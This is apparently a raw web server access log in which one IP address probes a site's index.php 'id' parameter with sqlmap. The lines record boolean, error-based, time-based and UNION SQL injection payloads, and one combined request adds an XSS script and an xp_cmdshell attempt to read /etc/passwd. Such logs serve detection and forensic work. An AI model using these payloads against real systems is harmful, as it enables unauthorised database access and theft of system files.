Raw Data: 127.0.0.1 - - [07/Mar/2024:12:50:05 0000] "GET / HTTP/1.1" 200 1860 "-" "curl/7.68.0"

Raw Data: 118.194.247.28 - - [07/Mar/2024:12:50:47 0000] "GET / HTTP/1.1" 200 902 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"

Raw Data: 118.194.247.28 - - [07/Mar/2024:12:51:44 0000] "GET / HTTP/1.1" 200 865 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"

Raw Data: 118.194.247.28 - - [07/Mar/2024:12:51:45 0000] "GET /?douj=3034 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')# HTTP/1.1" 200 865 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"

Raw Data: 118.194.247.28 - - [07/Mar/2024:12:53:07 0000] "GET /index.php?id=1'QaEOtG<'">PRVoKd HTTP/1.1" 200 865 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"

Raw Data: 118.194.247.28 - - [07/Mar/2024:12:53:07 0000] "GET /index.php?id=1").(,(,'.( HTTP/1.1" 200 865 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"

Raw Data: 118.194.247.28 - - [07/Mar/2024:12:53:08 0000] "GET /index.php?id=1 AND 9816=9452-- bkmh HTTP/1.1" 200 865 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"

Raw Data: 118.194.247.28 - - [07/Mar/2024:12:53:08 0000] "GET /index.php?id=(SELECT (CASE WHEN (4611=4629) THEN 1 ELSE (SELECT 4629 UNION SELECT 6288) END)) HTTP/1.1" 200 865 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"

Raw Data: 118.194.247.28 - - [07/Mar/2024:12:53:08 0000] "GET /index.php?id=1 AND 9816=9452-- bkmh HTTP/1.1" 200 865 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"

Raw Data: 118.194.247.28 - - [07/Mar/2024:12:53:09 0000] "GET /index.php?id=1) AND 2574=CAST((qkkvq)(SELECT (CASE WHEN (2574=2574) THEN 1 ELSE 0 END))::text(qpzjq) AS NUMERIC) AND (9806=9806 HTTP/1.1" 200 865 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"

Raw Data: 118.194.247.28 - - [07/Mar/2024:12:53:09 0000] "GET /index.php?id=1 AND EXTRACTVALUE(7321,CONCAT(\\,qkkvq,(SELECT (ELT(7321=7321,1))),0x71707a6a71)) HTTP/1.1" 200 865 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"

Raw Data: 118.194.247.28 - - [07/Mar/2024:12:53:10 0000] "GET /index.php?id=1' AND 2574=CAST((qkkvq)(SELECT (CASE WHEN (2574=2574) THEN 1 ELSE 0 END))::text(qpzjq) AS NUMERIC) AND 'qQpG'='qQpG HTTP/1.1" 200 865 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"

Raw Data: 118.194.247.28 - - [07/Mar/2024:12:53:10 0000] "GET /index.php?id=1') AND 2574=CAST((qkkvq)(SELECT (CASE WHEN (2574=2574) THEN 1 ELSE 0 END))::text(qpzjq) AS NUMERIC) AND ('FiHf'='FiHf HTTP/1.1" 200 865 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"

Raw Data: 118.194.247.28 - - [07/Mar/2024:12:53:11 0000] "GET /index.php?id=1') AND 5327 IN (SELECT (qkkvq(SELECT (CASE WHEN (5327=5327) THEN 1 ELSE 0 END))qpzjq)) AND ('QEdd'='QEdd HTTP/1.1" 200 865 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"

Raw Data: 118.194.247.28 - - [07/Mar/2024:12:53:13 0000] "GET /index.php?id=1);SELECT PG_SLEEP(5)-- HTTP/1.1" 200 865 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"

Raw Data: 118.194.247.28 - - [07/Mar/2024:12:53:13 0000] "GET /index.php?id=1 AND 2924=(SELECT UPPER(XMLType(<:qkkvq(SELECT (CASE WHEN (2924=2924) THEN 1 ELSE 0 END) FROM DUAL)qpzjq>)) FROM DUAL)-- uVLy HTTP/1.1" 200 865 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"

Raw Data: 118.194.247.28 - - [07/Mar/2024:12:53:13 0000] "GET /index.php?id=(SELECT CONCAT(CONCAT('qkkvq',(CASE WHEN (9638=9638) THEN '1' ELSE '0' END)),'qpzjq')) HTTP/1.1" 200 865 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"

Raw Data: 118.194.247.28 - - [07/Mar/2024:12:53:15 0000] "GET /index.php?id=1);SELECT DBMS_PIPE.RECEIVE_MESSAGE(hamM,5) FROM DUAL-- HTTP/1.1" 200 865 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"

Raw Data: 118.194.247.28 - - [07/Mar/2024:12:53:15 0000] "GET /index.php?id=1;WAITFOR DELAY '0:0:5'-- HTTP/1.1" 200 865 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"

Raw Data: 118.194.247.28 - - [07/Mar/2024:12:53:15 0000] "GET /index.php?id=1';WAITFOR DELAY '0:0:5'-- HTTP/1.1" 200 865 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"

Raw Data: 118.194.247.28 - - [07/Mar/2024:12:53:16 0000] "GET /index.php?id=1) AND (SELECT 7566 FROM (SELECT(SLEEP(5)))rMVR) AND (5961=5961 HTTP/1.1" 200 865 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"

Raw Data: 118.194.247.28 - - [07/Mar/2024:12:53:17 0000] "GET /index.php?id=1') AND (SELECT 7566 FROM (SELECT(SLEEP(5)))rMVR) AND ('vnXf'='vnXf HTTP/1.1" 200 865 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"

Raw Data: 118.194.247.28 - - [07/Mar/2024:12:53:47 0000] "GET /index.php?id=1 ORDER BY 8991-- eXLc HTTP/1.1" 200 865 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"